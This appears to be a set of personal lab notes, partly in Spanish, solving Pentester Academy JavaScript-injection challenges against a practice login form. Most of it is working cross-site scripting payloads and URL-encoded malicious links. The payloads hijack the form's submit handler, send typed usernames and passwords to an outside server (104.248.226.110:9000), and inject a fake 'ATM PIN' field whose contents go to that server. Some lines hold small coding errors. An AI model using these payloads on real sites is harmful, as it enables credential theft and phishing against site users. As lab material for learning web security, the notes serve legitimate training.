Challenge 1.

<script>
document.getElementByTagName("h2")[2].innerHTML = "Modified You";
document.getElementByTagName("h1")[0].innerHTML = "Find You";
</script>

Challenge 2.

<script>

var links = document.getElmentByTagName("a");

for (i=0; i < links.length; i++)
{
	links[i].href="http://pentesteracademy.com/topics";
	links[i].innerHTML = "Link Modified";
}

</script>

=====================================================================

---------------------------------
Challenge 3 - Hijack Form Submit
---------------------------------

Paso #1 - Revisar el codigo - 

===========FORM==========

  <h1 align="center"></h1>
        <h2></h2><h2></h2>

         <form class="form-signin">
        <h2 class="form-signin-heading">Please sign in</h2>
        <input type="text" value="" class="input-block-level" placeholder="Email address" name="email">
        <input type="password" class="input-block-level" placeholder="Password" name="password">
        <label class="checkbox">
          <input type="checkbox" value="remember-me" name="DoesThisMatter"> Remember me
        </label>
        <button class="btn btn-large btn-primary" type="submit">Sign in</button>
      </form>
========================ENDFORM========================
Paso #2 - Crear script de Injeccion. - 

>> http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?url

<script>
function InterceptForm(){
	var username = document.forms[0].elements[0].value;
	var password = document.forms[0].elements[1].value;

	alert(username + ' : ' + password);

}

document.forms[0].onsubmit = InterceptForm;
</script>

=========================[ENCODE]=====================
Paso #3 - Codificar el Script - 

>> https://meyerweb.com/eric/tools/dencoder/

%3Cscript%3E%0Afunction%20InterceptForm()%7B%0A%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%0A%09alert(username%20%2B%20%27%20%3A%20%27%20%2B%20password)%3B%0A%0A%7D%0A%0Adocument.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E

======================================================
Paso #4 - Injectar el URL malicioso.

[Malicious URL]

>> pentesteracademylab.appspot.com/lab/webapp/jfp/3?url=%3Cscript%3E%0Afunction%20InterceptForm()%7B%0A%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%0A%09alert(username%20%2B%20%27%20%3A%20%27%20%2B%20password)%3B%0A%0A%7D%0A%0Adocument.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
=======================================================
Paso #5 - Subir servidor HTTP

>> python -m SimpleHTTPServer 9000
=======================================================
Paso #6 - Modificar Script para conectarse al servidor Web

<script>
function InterceptForm(){
	var username = document.forms[0].elements[0].value;
	var password = document.forms[0].elements[1].value;

	new Image().src = "http://104.248.226.110:9000/?username="+username="&password="+password;

}

document.forms[0].onsubmit = InterceptForm;
</script>
========================================================

%3Cscript%3E%0Afunction%20InterceptForm()%7B%0A%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%0A%09new%20Image().src%20%3D%20%22http%3A%2F%2F104.248.226.110%3A9000%2F%3Fusername%3D%22%2Busername%3D%22%26password%3D%22%2Bpassword%3B%0A%7D%0Adocument.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E

[Malicious URL]

>> pentesteracademylab.appspot.com/lab/webapp/jfp/3?url=%3Cscript%3E%0Afunction%20InterceptForm()%7B%0A%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%0A%09new%20Image().src%20%3D%20%22http%3A%2F%2F104.248.226.110%3A9000%2F%3Fusername%3D%22%2Busername%3D%22%26password%3D%22%2Bpassword%3B%0A%0A%7D%0A%0Adocument.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
=========================================================
---------------------------------
Challenge 4 - Modify Form Fields
---------------------------------

>> http://pentesteracademylab.appspot.com/lab/webapp/jfp/4

Paso #1 - Revisar codigo


======================FORM==========================
<h1 align="center"></h1>
        <h2></h2><h2></h2>

         <form class="form-signin">
        <h2 class="form-signin-heading">Please sign in</h2>
        <input type="text" value="" class="input-block-level" placeholder="Email address" name="email">
        <input type="password" class="input-block-level" placeholder="Password" name="password">
        <label class="checkbox">
          <input type="checkbox" value="remember-me" name="DoesThisMatter"> Remember me
        </label>
        <button class="btn btn-large btn-primary" type="submit">Sign in</button>
      </form>

===============================ENDFORM=============================

Paso #2 - Programar Script

<script>

var input = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

var previous = document.forms[0].elements[0];
document.forms[0].insertBefore(input, previous);
document.forms[0].action = "http://104.248.226.110:9000/";

</script>
============================================
Paso #3 - Codificar el script

>> https://meyerweb.com/eric/tools/dencoder/

%3Cscript%3E%0A%0Avar%20input%20%3D%20document.createElement(%22input%22)%3B%0A%0Ainput.setAttribute(%22type%22%2C%20%22text%22)%3B%0Ainput.setAttribute(%22class%22%2C%20%22input-block-level%22)%3B%0Ainput.setAttribute(%22placeholder%22%2C%20%22ATM%20PIN%22)%3B%0Ainput.setAttribute(%22name%22%2C%20%22atmpin%22)%3B%0A%0Avar%20previous%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0Adocument.forms%5B0%5D.insertBefore(input%2C%20previous)%3B%0Adocument.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F104.248.226.110%3A9000%2F%22%3B%0A%0A%3C%2Fscript%3E

================================
Paso #4 - Insertar URL Maliciosa

http://pentesteracademylab.appspot.com/lab/webapp/jfp/4?url=%3Cscript%3E%0A%0Avar%20input%20%3D%20document.createElement(%22input%22)%3B%0A%0Ainput.setAttribute(%22type%22%2C%20%22text%22)%3B%0Ainput.setAttribute(%22class%22%2C%20%22input-block-level%22)%3B%0Ainput.setAttribute(%22placeholder%22%2C%20%22ATM%20PIN%22)%3B%0Ainput.setAttribute(%22name%22%2C%20%22atmpin%22)%3B%0A%0Avar%20previous%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0Adocument.forms%5B0%5D.insertBefore(input%2C%20previous)%3B%0Adocument.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F104.248.226.110%3A9000%2F%22%3B%0A%0A%3C%2Fscript%3E
